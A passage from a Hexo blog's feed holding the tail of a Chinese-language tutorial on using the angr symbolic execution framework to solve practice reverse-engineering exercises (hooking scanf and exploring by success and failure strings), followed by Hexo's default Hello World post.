claripy.BVS(&#x27;scanf0&#x27;, 8 * 80)</span><br><span class="line">      scanf0_address = param0</span><br><span class="line">      print(scanf0_address)</span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness = project.arch.memory_endness)</span><br><span class="line">      self.state.globals[&#x27;solutions&#x27;] = scanf0</span><br><span class="line"></span><br><span class="line">  scanf_symbol = &#x27;scanf&#x27;</span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  def is_successful(state):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    return &#x27;Congratulations&#x27;.encode() in stdout_output</span><br><span class="line">  simulation.explore(find=is_successful)</span><br><span class="line"></span><br><span class="line">  if simulation.found:</span><br><span class="line"></span><br><span class="line">    solution_state = simulation.found[0]</span><br><span class="line">    stored_solutions = solution_state.globals[&#x27;solutions&#x27;]</span><br><span class="line">    scanf0_solution = solution_state.solver.eval(stored_solutions)</span><br><span class="line">    print(scanf0_solution)</span><br><span class="line"></span><br><span class="line">  else:</span><br><span class="line">    raise Exception(&#x27;Could not find the solution&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="angr练习十八道"><a href="#angr练习十八道" class="headerlink" title="angr练习十八道"></a><strong>angr练习十八道</strong></h2><h3 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h3><p>本题知识点：在没有地址情况下，利用字符串来确定寻找地址和规避地址。</p><p>ida：<br><img src="/2022/08/07/angr%E5%AD%A6%E4%B9%A0/2022-02-02-23-34-24mk-.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def is_successful(state):</span><br><span class="line">  # Dump whatever has been printed out by the binary so far into a string.</span><br><span class="line">  stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line">  # Return whether &#x27;Good Job.&#x27; has been printed yet.</span><br><span class="line">  # (!)</span><br><span class="line">  return b&#x27;Good Job.&#x27; in stdout_output  # :boolean</span><br><span class="line"></span><br><span class="line">def should_abort(state):</span><br><span class="line">  stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">  return b&#x27;Try again.&#x27; in stdout_output  # :boolean</span><br><span class="line"></span><br><span class="line">simulation.explore(find=is_successful, avoid=should_abort)</span><br></pre></td></tr></table></figure><p>通过 <code>stdout_output = state.posix.dumps(sys.stdout.fileno())</code>和<code>return b&#39;Good Job.&#39; in stdout_output  # :boolean</code>来判断是否到底指定情况的地址，适用于多种情况而非一个地址的情况。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;angr学习&quot;&gt;&lt;a href=&quot;#angr学习&quot; class=&quot;headerlink&quot; title=&quot;angr学习&quot;&gt;&lt;/a&gt;&lt;strong&gt;angr学习&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;angr基本脚本&quot;&gt;&lt;a href=&quot;#angr基本脚本&quot; cl</summary>
      
    
    
    
    <category term="reverse" scheme="https://feverhu.github.io/categories/reverse/"/>
    
    
    <category term="angr" scheme="https://feverhu.github.io/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://feverhu.github.io/2022/07/31/hello-world/"/>
    <id>https://feverhu.github.io/2022/07/31/hello-world/</id>
    <published>2022-07-31T06:56:59.204Z</published>
    <updated>2022-08-07T02:22:07.305Z</updated>
    
    <content type="html"><![CDATA[<p>感谢牛逼的hexo！自带的hello world就留着致敬吧！^_^</p><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;感谢牛逼的hexo！自带的hello world就留着致敬吧！^_^&lt;/p&gt;
&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;ht</summary>
      
    
    
    
    
    <category term="tags" scheme="https://feverhu.github.io/tags/tags/"/>
    
  </entry>
  
</feed>
